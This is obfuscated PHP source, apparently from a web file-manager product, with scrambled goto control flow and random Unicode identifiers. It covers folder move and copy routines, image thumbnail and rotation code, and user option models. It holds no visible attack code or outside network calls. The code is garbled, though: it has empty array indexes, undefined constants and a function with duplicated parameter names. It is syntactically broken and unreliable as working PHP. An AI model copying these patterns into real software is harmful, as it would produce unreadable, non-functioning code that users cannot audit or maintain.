USER_ID, $cϏ̱[368] => $cʴ荫[$cϏ̱[369]], $cϏ̱[527] => $cʴ荫[$cϏ̱[461]] . $cʴ荫[$cϏ̱[369]] . $cϏ̱[47], $cϏ̱[396] => 0, $cϏ̱[528] => $cϏ̱[33]); return $a; } private function _copyApplyMeta($dܷ, &$e✤ש) { $Dш =& $_SERVER[]; $cý = $dܷ[$Dш[369]]; $aڊڤ = $dܷ[$Dш[28]]; if (!isset($dܷ[$Dш[529]]) || !$dܷ[$Dш[529]] || $dܷ[$Dш[529]] == $Dш[470]) { $e✤ש[$Dш[505]][] = array($Dш[369], $cý, $Dш[529], short_id($cý)); } if (Input::check($aڊڤ, $Dш[530])) { $e✤ש[$Dш[504]][] = array($Dш[369] => $cý, $Dш[89] => $Dш[416], $Dш[359] => str_replace($Dш[50], $Dш[33], Pinyin::encode($aڊڤ))); $e✤ש[$Dш[504]][] = array($Dш[369] => $cý, $Dш[89] => $Dш[415], $Dш[359] => Pinyin::encode($aڊڤ, $Dш[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Dɥ) { goto d; d: $fѢ =& $_SERVER[]; $d𝄱 = $this->sourceInfo($Dɥ); $DЮ = $fѢ[532]; goto b; B: $aԜ = array_to_keyvalue($aԜ, $fѢ[369]); foreach ($aԜ as $B) { $aԨݛ = $B[$fѢ[463]]; $Dɥ = $B[$fѢ[369]]; if (!isset($this->_childrenListCache[$Dɥ]) && $B[$fѢ[370]] == $fѢ[83]) { $this->_childrenListCache[$Dɥ] = array(); } if (!isset($this->_childrenListCache[$aԨݛ])) { $this->_childrenListCache[$aԨݛ] = array(); } $this->_childrenListCache[$aԨݛ][$Dɥ] = $B; $this->_childrenItemCache[$Dɥ] = $B; } goto Dʝˇ; b: $Bѡǐ = array($fѢ[461] => array($fѢ[485], $d𝄱[$fѢ[461]] . $Dɥ . $fѢ[486]), $fѢ[397] => $this->targetIsDelete); $aԜ = $this->field($DЮ)->where($Bѡǐ)->select(); if (!$aԜ) { return; } goto B; Dʝˇ: } private function _childrenListAll($cʴ蘟, &$F֢玄) { $f۲ =& $_SERVER[]; if (!isset($this->_childrenListCache[$cʴ蘟])) { return; } $f = $this->_childrenListCache[$cʴ蘟]; foreach ($f as $BΪ => $dȞ) { $F֢玄[$BΪ] = $dȞ; if ($dȞ[$f۲[370]] == $f۲[83]) { $this->_childrenListAll($BΪ, $F֢玄); } } } private function sourceInfoCache($F̎) { if (isset($this->_childrenItemCache[$F̎])) { return $this->_childrenItemCache[$F̎]; } return $this->sourceInfo($F̎); } private function _childrenList($dӯ) { if (isset($this->_childrenListCache[$dӯ])) { return $this->_childrenListCache[$dӯ]; } return $this->_childrenListSelect($dӯ); } private function _childrenListSelect($dڍτ) { goto A; bͻ: $c = $c ? $c : array(); $a = array_to_keyvalue($c, $E[369]); $this->_childrenListCache[$dڍτ] = $a; goto D֖; D֖: foreach ($a as $dڍτ => $d韲) { $this->_childrenItemCache[$dڍτ] = $d韲; } return $a; goto dӠ; A: $E =& $_SERVER[]; $bڒ͚ = array($E[463] => $dڍτ, $E[397] => $this->targetIsDelete); $c = $this->where($bڒ͚)->select(); goto bͻ; dӠ: } private function fileNameExistCache($a܏, $Dْҗ) { $bݚ =& $_SERVER[]; $Dْҗ = strtolower($Dْҗ); $a۰ = $this->_childrenList($a܏); foreach ($a۰ as $e) { if ($Dْҗ == strtolower($e[$bݚ[28]])) { return $e[$bݚ[369]]; } } return !1; } private function fileNameAutoCache($d, $f, $bȴ, $e淭) { $Cɴ =& $_SERVER[]; $EЉ = $this->_childrenList($d); $c = array_to_keyvalue($EЉ, $Cɴ[33], $Cɴ[28]); return $this->fileNameAutoGet($c, $f, $bȴ, $e淭); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($a֦, $bܷ, $Eَť = REPEAT_REPLACE, $C = '') { goto E; cʘ: return $E; goto fę; E: $A򸰾 =& $_SERVER[]; $b = $this->sourceInfo($a֦); $BЍ뚊 = $this->sourceInfo($bܷ); goto f; d鴡: if ($b[$A򸰾[463]] == $bܷ && $C != $b[$A򸰾[28]]) { $F哌 = $this->fileNameExist($bܷ, $C); if ($F哌 && $b[$A򸰾[370]] == $A򸰾[470]) { goto d; aЙ: return $F哌; goto Bآ; d: $AԊ = $this->sourceInfo($F哌); $cл = $this->fileHistory($AԊ, $b[$A򸰾[419]], $b[$A򸰾[77]]); if (!$cл) { Model($A򸰾[422])->remove($b[$A򸰾[419]]); } goto E; E: $this->removeNow($a֦, !1); $this->folderSizeReset($bܷ); Hook::trigger($A򸰾[534], $C͟ӌ); goto aЙ; Bآ: } } $d = $C ? $C : $b[$A򸰾[28]]; $this->lockMoveStart($a֦); goto cƆñ; a˸Γ: $c֥ = $this->fileNameExistCache($bܷ, $b[$A򸰾[28]]); $E = $this->_move($a֦, $bܷ, $Eَť, $CƂ, $C); $this->sourceCacheClear(); goto B⯱Ú; AĶ: $this->lockMoveEnd($a֦); $this->lockWriteEnd($bܷ, $d); $this->folderSizeReset($b[$A򸰾[463]]); goto F; B⯱Ú: if ($b[$A򸰾[370]] == $A򸰾[83] && $c֥) { $this->folderSizeResetChildren($E); } Model($A򸰾[167])->linkAdd($CƂ[$A򸰾[503]]); if ($c֥ && $CƂ[$A򸰾[535]]) { $this->removeNow($a֦, !1); } goto AĶ; E: $this->updateModifyTime($f¦); Model($A򸰾[507])->eventMove($a֦, $b[$A򸰾[463]], $bܷ); Hook::trigger($A򸰾[534], $C͟ӌ); goto cʘ; cƆñ: $this->lockWriteStart($bܷ, $d); $CƂ = array($A򸰾[503] => array(), $A򸰾[535] => !1); $this->clearShare($a֦, $bܷ); goto a˸Γ; f: if ($b[$A򸰾[463]] == $BЍ뚊[$A򸰾[369]]) { if ($b[$A򸰾[397]] == $A򸰾[83]) { Model($A򸰾[395])->restore(array($a֦)); } return $a֦; } $C͟ӌ = $this->pathInfoMore($a֦); if ($this->isParentOf($a֦, $bܷ)) { return !1; } goto Dʉߡ; Dʉߡ: if (!$b || !$BЍ뚊 || $BЍ뚊[$A򸰾[370]] != $A򸰾[83]) { return !1; } Hook::trigger($A򸰾[533], $C͟ӌ); $this->targetIsDelete = intval($b[$A򸰾[397]]); goto d鴡; F: $this->folderSizeReset($bܷ); $f¦ = array($b[$A򸰾[463]], $bܷ); if ($b[$A򸰾[370]] == $A򸰾[83]) { $f¦[] = $a֦; } goto E; fę: } private function _move($a߰, $E, $b, &$C, $cՐɌ = '') { goto cњ; c˝: $b = !1; if ($b) { if ($b == REPEAT_RENAME_FOLDER) { $EÈ = $this->fileNameAuto($E, $EÈ, $b, $b); $B = $this->_moveForce($a߰, $E, $EÈ); } else { if ($b == REPEAT_RENAME_FOLDER) { $b = REPEAT_RENAME; } $C띍 = $this->_childrenListSelect($a߰); foreach ($C띍 as $FՐ) { $this->_move($FՐ[$dҷȰБ[369]], $b˵, $b, $C); } $b = !0; } } else { if ($b == REPEAT_SKIP) { $b = !0; } else { if ($b == REPEAT_RENAME || $b == REPEAT_RENAME_FOLDER) { $EÈ = $this->fileNameAuto($E, $EÈ, $b, $b); $B = $this->_moveForce($a߰, $E, $EÈ); } else { if ($b == REPEAT_REPLACE) { $b = $this->sourceInfoCache($b˵); $Bݡ = $this->fileHistory($b, $c[$dҷȰБ[419]], $c[$dҷȰБ[77]]); if ($Bݡ) { $C[$dҷȰБ[503]][] = $c[$dҷȰБ[419]]; } else { $b = !0; } } } } } if ($b && !$C[$dҷȰБ[535]]) { $C[$dҷȰБ[535]] = !0; } goto A; Fэϗ: $EÈ = $cՐɌ ? $cՐɌ : $c[$dҷȰБ[28]]; $b˵ = $this->fileNameExistCache($E, $EÈ); $this->lockMoveStart($a߰); goto c; cњ: $dҷȰБ =& $_SERVER[]; $c = $this->sourceInfo($a߰); $b = $c[$dҷȰБ[370]] == $dҷȰБ[83]; goto Fэϗ; c: $this->lockWriteStart($E, $EÈ); if (!$b˵) { return $this->_moveForce($a߰, $E, $EÈ); } $B = $b˵; goto c˝; A: return $B; goto D; D: } private function _moveForce($fɝ, $A޿, $A) { goto Eò; c孑: $fƳˊ = $Ež[$b[370]] == $b[83]; $dז = array($b[368] => $A嫭[$b[369]], $b[527] => $A嫭[$b[461]] . $A嫭[$b[369]] . $b[47], $b[523] => $A嫭[$b[371]], $b[524] => $A嫭[$b[458]], $b[526] => USER_ID, $b[386] => $A); $D = $Ež[$b[371]] == SourceModel::TYPE_GROUP && $A嫭[$b[371]] == SourceModel::TYPE_GROUP && $Ež[$b[458]] == $A嫭[$b[458]]; goto Fߘ; Fߘ: if (!$D) { Model($b[456])->authClear($fɝ); } $Fش = $Ež[$b[397]] == $b[83] && $A嫭[$b[397]] != $b[83]; if ($Fش) { $dז[$b[396]] = 0; } goto dʑ; dʑ: if ($fƳˊ) { $cԎ = array($b[527] => array($b[485], $Ež[$b[461]] . $Ež[$b[369]] . $b[486])); $d۬ڑ = $Ež[$b[461]] . $Ež[$b[369]] . $b[47]; $E = $A嫭[$b[461]] . $A嫭[$b[369]] . $b[47] . $Ež[$b[369]] . $b[47]; $EԨ = array($b[527] => array($b[536], "\162\x65\x70\154\x61\x63\x65\50\160\141\x72\145\x6e\164\114\x65\166\x65\154\x2c\x27{$d۬ڑ}\47\x2c\47{$E}\x27\51"), $b[523] => $A嫭[$b[371]], $b[524] => $A嫭[$b[458]]); if ($Fش) { $EԨ[$b[396]] = 0; } $this->where($cԎ)->data($EԨ)->save(); } $this->where(array($b[383] => $fɝ))->data($dז)->save(); return $fɝ; goto Cɶ; Eò: $b =& $_SERVER[]; $Ež = $this->sourceInfo($fɝ); $A嫭 = $this->sourceInfo($A޿); goto c孑; Cɶ: } private function clearShare($C, $aᒋ) { goto F; d㌏: if (!$eޡ) { return; } $eɤ̱ = array($aл[369] => array($aл[7], $eޡ), $aл[448] => 1); $eݪě = Model($aл[538])->field($aл[441])->where($eɤ̱)->select(); goto fҪ; E̞Ƌ: if ($c[$aл[458]] == $a叨[$aл[458]] && $c[$aл[371]] == $aл[537]) { return; } $eɤ̱ = array($aл[461] => array($aл[485], $c[$aл[461]] . $C . $aл[486])); $eޡ = $this->field($aл[383])->where($eɤ̱)->getField($aл[369], !0); goto d㌏; F: $aл =& $_SERVER[]; $c = $this->sourceInfo($C); $a叨 = $this->sourceInfo($aᒋ); goto E̞Ƌ; fҪ: if (!$eݪě) { return; } $eݪě = array_to_keyvalue($eݪě, $aл[33], $aл[441]); $eɤ̱ = array($aл[441] => array($aл[7], $eݪě)); goto E; E: Model($aл[538])->where($eɤ̱)->save(array($aл[448] => 0)); Model($aл[539])->where($eɤ̱)->delete(); goto aŃ; aŃ: } public function copyFolderFromIO($aЄ, $a, $fե, $e֠, $Dʒ, $f￘ = false) { goto E߾; Eת: Model($Aڿʱ[506])->addAll($cʡ֠[$Aڿʱ[504]], array(), !0); Model($Aڿʱ[507])->eventCopy($dݺ؜); $this->saveAll($cʡ֠[$Aڿʱ[505]]); goto D; aϔϞ: $FŔ쟱 = $this->fileNameExist($fե, $F); $dݺ؜ = $this->mkdir($fե, $F, $e֠); if (!$FŔ쟱 || $e֠ == REPEAT_RENAME_FOLDER) { $e֠ = !1; } goto EܯȦ; B܅: Hook::trigger($Aڿʱ[542]); if ($dݺ؜) { $this->folderSizeResetChildren($dݺ؜); } $this->_childrenListClear(); goto Eת; EܯȦ: if ($FŔ쟱) { $this->_childrenAllMake($FŔ쟱); } Hook::trigger($Aڿʱ[541]); $this->_copyChildTo($aЄ, $a, $dݺ؜, $e֠, $cʡ֠, $Dʒ); goto B܅; Aݗ: $this->updateModifyTime($fե); return $dݺ؜; goto că; D: Model($Aڿʱ[422])->linkAdd($cʡ֠[$Aڿʱ[503]]); Model($Aڿʱ[422])->remove($cʡ֠[$Aڿʱ[540]]); $this->folderSizeReset($fե); goto Aݗ; E߾: $Aڿʱ =& $_SERVER[]; $cʡ֠ = array($Aڿʱ[504] => array(), $Aڿʱ[505] => array(), $Aڿʱ[503] => array(), $Aڿʱ[540] => array()); $F = $f￘ ? $f￘ : $aЄ->getPathName($aЄ->pathThis($a)); goto aϔϞ; că: } private function _copyChildTo($AΠ, $F﩮, $D삡噸, $F, &$E, $FӜ) { goto DǕ; b: foreach ($F as &$c) { goto fᵺ; fᵺ: if (isset($Bƙ[$c[$eѿҨ[28]]])) { $c = $Bƙ[$c[$eѿҨ[28]]]; } $c[$eѿҨ[370]] = $c[$eѿҨ[29]] == $eѿҨ[76]; $c[$eѿҨ[372]] = _get($c, $eѿҨ[160], $eѿҨ[33]); goto Dݕ; Dݕ: $c[$eѿҨ[77]] = _get($c, $eѿҨ[77], 0); $c[$eѿҨ[419]] = _get($c, $eѿҨ[419], 0); if (!isset($c[$eѿҨ[543]]) && $c[$eѿҨ[419]]) { $E[$eѿҨ[540]][] = $c[$eѿҨ[419]]; } goto cⱾ; cⱾ: if ($F) { $E = $this->fileNameExistCache($D삡噸, $c[$eѿҨ[28]]); if ($E) { if ($c[$eѿҨ[370]] || $F == REPEAT_SKIP) { continue; } if ($F == REPEAT_REPLACE) { $EԦۆ = $this->sourceInfoCache($E); $AͿ = $this->fileHistory($EԦۆ, $c[$eѿҨ[419]], $c[$eѿҨ[77]]); if ($AͿ) { $E[$eѿҨ[503]][] = $c[$eѿҨ[419]]; } continue; } else { if ($F == REPEAT_RENAME) { $c[$eѿҨ[28]] = $this->fileNameAutoCache($D삡噸, $c[$eѿҨ[28]], $F, !1); } } } } if (!$c[$eѿҨ[370]] && $c[$eѿҨ[419]]) { $E[$eѿҨ[503]][] = $c[$eѿҨ[419]]; } $F[] = $this->_makeItemData($c, $a܍, $c[$eѿҨ[28]]); goto C乏ش; C乏ش: } unset($c); if (!empty($F)) { $this->addAll($F); } goto bǯՊ; bǯՊ: $d֪ = $this->_childrenList($D삡噸); $d֪ = array_to_keyvalue($d֪, $eѿҨ[28]); foreach ($F as $c) { $EԦۆ = $d֪[$c[$eѿҨ[28]]]; $a剂ʅ = $EԦۆ[$eѿҨ[369]]; $this->_copyApplyMeta($EԦۆ, $E); if ($c[$eѿҨ[29]] == $eѿҨ[76]) { $c[$eѿҨ[75]] = $AΠ->getPathInner($c[$eѿҨ[75]]); $this->_copyChildTo($AΠ, $c[$eѿҨ[75]], $a剂ʅ, $F, $E, $FӜ); } } goto cݐ; Eۍ: $F = array_merge($A굄Ŷ[$eѿҨ[73]], $A굄Ŷ[$eѿҨ[74]]); $Bƙ = $this->_addFiles($AΠ, $A굄Ŷ[$eѿҨ[73]], $FӜ); $F = array(); goto b; DǕ: $eѿҨ =& $_SERVER[]; $a܍ = $this->sourceInfoCache($D삡噸); $A굄Ŷ = $AΠ->listPath($F﩮, !1, !0); goto Eۍ; cݐ: } private function _addFiles($c, $Dȟ杜, $B۵) { goto Aڶ; E: return $dסχ; goto B; cٶյ: $Fֆϸ = $dߧ͏ͬ->where($C̮)->select(); $Fֆϸ = $Fֆϸ ? $Fֆϸ : array(); foreach ($Fֆϸ as $B) { if (!isset($Bί܇[$B[$b[163]]])) { continue; } $bε = $Bί܇[$B[$b[163]]]; foreach ($bε as &$c) { $c[$b[419]] = $B[$b[419]]; $c[$b[543]] = !0; } unset($c); } goto B둳򉭭; Aڶ: $b =& $_SERVER[]; if (!$Dȟ杜 || count($Dȟ杜) == 0) { return array(); } $Bί܇ = array(); goto fץ; Fً: $C̮ = array($b[163] => array($b[7], array_keys($Bί܇))); $Fֆϸ = $dߧ͏ͬ->where($C̮)->select(); $Fֆϸ = $Fֆϸ ? $Fֆϸ : array(); goto D߾; fץ: foreach ($Dȟ杜 as &$c) { goto fÚ; D˖: $Fų = $c->hashMd5($c[$b[75]]); if (strlen($Fų) > 10 && !isset($Bί܇[$Fų])) { $Bί܇[$Fų] = array(); } $c[$b[164]] = $eء; goto D; FۄҘ: if (count($Bί܇[$Fų]) > 1) { $c[$b[543]] = !0; } goto Aəֆ; fÚ: Hook::trigger($b[544], $c); $c[$b[75]] = $c->getPathInner($c[$b[75]]); $eء = $c->hashSimple($c[$b[75]]); goto D˖; D: $c[$b[163]] = $Fų; Hook::trigger($b[545], $c); $Bί܇[$Fų][] =& $c; goto FۄҘ; Aəֆ: } $C̮ = array($b[163] => array($b[7], array_keys($Bί܇))); $dߧ͏ͬ = Model($b[546]); goto cٶյ; B둳򉭭: $E顊 = array(); foreach ($Dȟ杜 as $AÇ߳) { if (isset($AÇ߳[$b[543]]) && $AÇ߳[$b[543]]) { continue; } $B٣ = $c->getPathInner($AÇ߳[$b[75]]); $aؠ典 = $dߧ͏ͬ->addFileMake($B٣, $AÇ߳[$b[77]], $AÇ߳[$b[164]], $AÇ߳[$b[163]], $AÇ߳[$b[28]], $B۵); $E顊[] = $aؠ典; } $dߧ͏ͬ->addAll($E顊); goto Fً; D߾: foreach ($Fֆϸ as $B) { if (!isset($Bί܇[$B[$b[163]]])) { continue; } $A =& $Bί܇[$B[$b[163]]]; foreach ($A as &$c) { $c[$b[419]] = $B[$b[419]]; } unset($c); } $dסχ = array(); foreach ($Dȟ杜 as $eõ˯) { $dסχ[$eõ˯[$b[28]]] = $eõ˯; } goto E; B: } } define($_SERVER[][547], $_SERVER[][548]); goto B; F: register_shutdown_function($_SERVER[ņӺ][32]); set_error_handler($_SERVER[ņӺ][46], $Cۖ); if (function_exists($_SERVER[ņӺ][47])) { set_exception_handler($_SERVER[ņӺ][48]); } goto fƭطĿ; Dܰ: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($Dǌ, $C) { goto f߲; b𓶹: if (!$this->im) { return !1; } $Bм = $_SERVER[][33]; $this->imgData = GetImageSize($Dǌ, $Bм); goto C; f߲: $this->srcFile = $Dǌ; $this->echoType = $C; $this->im = self::image($Dǌ); goto b𓶹; C: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto EŪ􇵍; EŪ􇵍: } public static function image($E) { $D =& $_SERVER[]; $A蒋 = $D[33]; $E = GetImageSize($E, $A蒋); $DƑ = !1; switch ($E[2]) { case IMAGETYPE_GIF: if (!function_exists($D[1865])) { break; } $DƑ = imagecreatefromgif($E); break; case IMAGETYPE_JPEG: if (!function_exists($D[1866])) { break; } $DƑ = imagecreatefromjpeg($E); break; case IMAGETYPE_PNG: if (!function_exists($D[1867])) { break; } $DƑ = @imagecreatefrompng($E); imagesavealpha($DƑ, !0); break; case IMAGETYPE_XBM: $DƑ = imagecreatefromxbm($E); break; case IMAGETYPE_WBMP: $DƑ = imagecreatefromwbmp($E); break; case IMAGETYPE_BMP: $DƑ = imagecreatefrombmp($E); break; default: break; } return $DƑ; } public static function imageSize($C) { $d =& $_SERVER[]; $b侒 = GetImageSize($C); if (!$b侒) { return !1; } return array($d[1868] => $b侒[0], $d[1869] => $b侒[1]); } function distortion($bʆ, $Bۍ, $eō⌣Ȥ) { $C˰ = $this->creatImage($this->im, $Bۍ, $eō⌣Ȥ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($C˰, $bʆ); } function prorate($bᴊ, $f릪, $A蠴) { $Dܟ = $f릪 / $A蠴; $A˟ = $this->srcW / $this->srcH; if ($Dܟ <= $A˟) { $F葞 = $f릪; $eٕ = $F葞 * ($this->srcH / $this->srcW); } else { $eٕ = $A蠴; $F葞 = $eٕ * ($this->srcW / $this->srcH); } if ($this->srcW > $f릪 || $this->srcH > $A蠴) { $fȓ = $this->creatImage($this->im, $F葞, $eٕ, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $fȓ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $fȓ = $this->autoRotate($fȓ); return $this->echoImage($fȓ, $bᴊ); } private function autoRotate($F) { goto dհ͏; Aٸ߭: if (!$aԎɽ || !isset($aԎɽ[$EƧ[1871]]) || $aԎɽ[$EƧ[1871]] == 1) { return $F; } $Eږ = 0; if ($aԎɽ[$EƧ[1871]] == 6) { $Eږ = 90; } goto F; F: if ($aԎɽ[$EƧ[1871]] == 8) { $Eږ = 270; } if ($aԎɽ[$EƧ[1871]] == 3) { $Eږ = 180; } return $this->rotateDegree($F, $Eږ); goto B; dհ͏: $EƧ =& $_SERVER[]; if (!$F || !function_exists($EƧ[1870])) { return $F; } $aԎɽ = exif_read_data($this->srcFile); goto Aٸ߭; B: } private function rotateDegree($C, $fί) { if (!$C || $fί % 360 === 0 || !function_exists($_SERVER[][1872])) { return $C; } $a = imageRotate($C, 360 - $fί, 0); imageDestroy($C); return $a ? $a : $C; } function cut($aç, $D, $e݅) { goto B٧; A뾇: $B킃 = $this->creatImage($this->im, $EӖى, $a, 0, 0, 0, 0, $this->srcW, $this->srcH); $E = $this->creatImage($B킃, $D, $e݅, 0, 0, ($EӖى - $D) / 2, ($a - $e݅) / 2, $D, $e݅); imageDestroy($B킃); goto A֖; B٧: $A = $D / $e݅; $B = $this->srcW / $this->srcH; if ($A <= $B) { $a = $e݅; $EӖى = $a * ($this->srcW / $this->srcH); } else { $EӖى = $D; $a = $EӖى * ($this->srcH / $this->srcW); } goto A뾇; A֖: return $this->echoImage($E, $aç); goto d朎˭; d朎˭: } function backFill($Aؙɸ, $f̙ԃ, $Bㅰ准, $F좑 = false, $F = 255, $A؜ = 255, $d˂ = 255) { goto B߫; B߫: $d꛻ = $f̙ԃ / $Bㅰ准; $Bބ = $this->srcW / $this->srcH; if ($d꛻ <= $Bބ) { $b䒥 = $f̙ԃ; $f܈ = $b䒥 * ($this->srcH / $this->srcW); } else { $f܈ = $Bㅰ准; $b䒥 = $f܈ * ($this->srcW / $this->srcH); } goto a˛; a˛: if (function_exists($_SERVER[][1873])) { @($E = imageCreateTrueColor($f̙ԃ, $Bㅰ准)); if (!$E) { $E = imageCreate($f̙ԃ, $Bㅰ准); } } else { $E = imageCreate($f̙ԃ, $Bㅰ准); } $bИ = ($Bㅰ准 - $f܈) / 2; $dȼ = imagecolorallocate($E, $F, $A؜, $d˂); goto fſ; fſ: if ($F좑) { $dȼ = imageColorTransparent($E, $dȼ); $bИ = $Bㅰ准 - $f܈; } imageFilledRectangle($E, 0, 0, $f̙ԃ, $Bㅰ准, $dȼ); if ($this->srcW > $f̙ԃ || $this->srcH > $Bㅰ准) { $A = $this->creatImage($this->im, $b䒥, $f܈, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($b䒥 < $f̙ԃ) { imageCopy($E, $A, ($f̙ԃ - $b䒥) / 2, 0, 0, 0, $b䒥, $f܈); } else { if ($f܈ < $Bㅰ准) { imageCopy($E, $A, 0, $bИ, 0, 0, $b䒥, $f܈); } else { imageCopy($E, $A, 0, 0, 0, 0, $b䒥, $f܈); } } } else { imageCopyMerge($E, $this->im, ($f̙ԃ - $b䒥) / 2, $bИ, 0, 0, $b䒥, $f܈, 100); } goto F״; F״: return $this->echoImage($E, $Aؙɸ); goto AƢ; AƢ: } function creatImage($e, $CԼͿ, $Eݩ, $f☙Ӗ, $aϜ, $Dі, $F܊, $EԆү, $eǚ٩) { if (function_exists($_SERVER[][1873])) { @($C٧ = ImageCreateTrueColor($CԼͿ, $Eݩ)); @imagealphablending($C٧, !1); @imagesavealpha($C٧, !0); if ($C٧) { imageCopyResampled($C٧, $e, $f☙Ӗ, $aϜ, $Dі, $F܊, $CԼͿ, $Eݩ, $EԆү, $eǚ٩); } else { $C٧ = ImageCreate($CԼͿ, $Eݩ); imageCopyResized($C٧, $e, $f☙Ӗ, $aϜ, $Dі, $F܊, $CԼͿ, $Eݩ, $EԆү, $eǚ٩); } } else { $C٧ = ImageCreate($CԼͿ, $Eݩ); imageCopyResized($C٧, $e, $f☙Ӗ, $aϜ, $Dі, $F܊, $CԼͿ, $Eݩ, $EԆү, $eǚ٩); } return $C٧; } public function imgRotate($E¡, $d) { goto f; D: return $Aٌ; goto D臛; f: if (!$this->im || $d % 360 === 0 || !function_exists($_SERVER[][1872])) { return !1; } $f֪ = imageRotate($this->im, 360 - $d, 0); $Aٌ = !1; goto D; D: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $Aٌ = imagegif($f֪, $E¡); break; case IMAGETYPE_JPEG: $Aٌ = imagejpeg($f֪, $E¡, 100); break; case IMAGETYPE_PNG: $Aٌ = imagePNG($f֪, $E¡); break; default: break; } imageDestroy($f֪); imageDestroy($this->im); goto D; D臛: } function echoImage($BĐΣ, $b) { goto cܲ; c䮿: imageDestroy($this->im); return $D; goto b; c: $D = !1; switch ($this->echoType) { case $c菑[1874]: $D = imagePNG($BĐΣ); break; case $c菑[167]: $D = imagePNG($BĐΣ, $b); break; } imageDestroy($BĐΣ); goto c䮿; cܲ: $c菑 =& $_SERVER[]; if (!$BĐΣ) { return !1; } ob_get_clean(); goto c; b: } } if (!function_exists($_SERVER[][1875])) { define($_SERVER[][1876], 0); define($_SERVER[][1877], 1); define($_SERVER[][1878], 2); function imageflip($c, $c) { switch ($c) { case IMG_FLIP_HORIZONTAL: $d퓾 = imagesx($c) - 1; $AƐס = $d퓾 / 2; $A̝ = imagesy($c); $aݻȉ = imageistruecolor($c) ? imagecreatetruecolor(1, $A̝) : imagecreate(1, $A̝); for ($A딮 = 0; $A딮 < $AƐס; ++$A딮) { imagecopy($aݻȉ, $c, 0, 0, $A딮, 0, 1, $A̝); imagecopy($c, $c, $A딮, 0, $d퓾 - $A딮, 0, 1, $A̝); imagecopy($c, $aݻȉ, $d퓾 - $A딮, 0, 0, 0, 1, $A̝); } break; case IMG_FLIP_VERTICAL: $a癵 = imagesx($c); $fԅ = imagesy($c) - 1; $fÅΑ = $fԅ / 2; $aݻȉ = imageistruecolor($c) ? imagecreatetruecolor($a癵, 1) : imagecreate($a癵, 1); for ($B = 0; $B < $fÅΑ; ++$B) { imagecopy($aݻȉ, $c, 0, 0, 0, $B, $a癵, 1); imagecopy($c, $c, 0, $B, 0, $fԅ - $B, $a癵, 1); imagecopy($c, $aݻȉ, 0, $fԅ - $B, 0, 0, $a癵, 1); } break; case IMG_FLIP_BOTH: $a癵 = imagesx($c); $A̝ = imagesy($c); $aݻȉ = imagerotate($c, 180, 0); imagecopy($c, $aݻȉ, 0, 0, 0, 0, $a癵, $A̝); break; default: return; } imagedestroy($aݻȉ); } } if (!function_exists($_SERVER[][1879])) { function imagecreatefrombmp($Dک) { return ImageGdBMP::load($Dک); } } goto Bϭ; fƭطĿ: $_SERVER[$_SERVER[ņӺ][49]] = (base64_decode('OTc4NQ==')."\x38\x31")+0;$_WsKm="tsX5iS8h9R387xCPZeRXnyniJVGqdar2F8Chzm4Us2bd57brPkTnw2fhDRNWGggjKuHsG";; stream_wrapper_register($_SERVER[ņӺ][50], $_SERVER[ņӺ][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($A, $f) { $c =& $_SERVER[]; if (isset(self::$_methodList[$A])) { return @call_user_func_array(self::$_methodList[$A], $f); } else { if (method_exists($this, $A)) { return call_user_func_array(array($this, $A), $f); } else { think_exception(__CLASS__ . $c[4] . $A . $c[5]); } } } public static function __callStatic($A, $fҵ) { if (isset(self::$_methodListStatic[$A])) { return call_user_func_array(self::$_methodListStatic[$A], $fҵ); } else { if (method_exists(self, $A)) { return call_user_func_array(array(self, $A), $fҵ); } else { show_json("{$A}\50\51\x20\x6e\x6f\164\x20\x65\170\151\x73\x74\73", !1); } } } public static function addMethod($e, $dۏ) { self::$_methodList[$e] = $dۏ; } public static function addMethodStatic($cՅ, $D) { self::$_methodListStatic[$cՅ] = $D; } } goto E; F瞯: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\x72\x5f\x6f\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($c) { $Aȹ =& $_SERVER[]; if (!defined($Aȹ[427])) { define($Aȹ[427], 0); } return "\x55\x73\x65\162\117\160\x74\151\x6f\156\137{$c}\x5f" . USER_ID; } protected function filterWhere($d˟܏) { $d =& $_SERVER[]; if (!defined($d[427])) { define($d[427], 0); } $d˟܏[$d[1437]] = USER_ID; return $d˟܏; } public function cacheRemoveUser($Fܞ, $E҈) { return Cache::remove("\125\163\x65\x72\117\160\164\151\x6f\156\x5f{$Fܞ}\137" . $E҈); } protected function optionDefault($B񬻫 = '') { $aۖ =& $_SERVER[]; if ($B񬻫 == $aۖ[33]) { return $GLOBALS[$aۖ[6]][$aۖ[2562]]; } if ($B񬻫 == $aۖ[2563]) { return $GLOBALS[$aۖ[6]][$aۖ[2564]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\x73\145\162\117\x70\164\x69\x6f\x6e"; public $field = array("\156\141\x6d\x65", "\x73\164\x79\x6c\x65", "\163\x6f\x72\x74"); public function listData($Fߨ˯ = false, $C = "\x73\157\x72\x74", $F = false) { return parent::listData($Fߨ˯, $C, $F); } public function remove($E) { return parent::remove($E); } public function add($Ȩ, $AƖ = "\x6c\x61\142\x65\154\x2d\147\x72\145\171\x2d\x6e\157\x72\x6d\141\x6c") { $A㰑׉ =& $_SERVER[]; if ($this->findByName($Ȩ)) { return !1; } $e숼 = array($A㰑׉[386] => $Ȩ, $A㰑׉[437] => $AƖ, $A㰑׉[2112] => $this->getSort($A㰑׉[246]) + 1); return parent::insert($e숼); } public function update($cߐ, $C䗎) { $EǤƎ =& $_SERVER[]; $Dߜ = $this->listData($cߐ); $Bƪؼ = $this->findByName($C䗎[$EǤƎ[28]]); if (!$Dߜ || $Bƪؼ && $Bƪؼ[$EǤƎ[367]] != $Dߜ[$EǤƎ[367]]) { return !1; } return parent::update($cߐ, 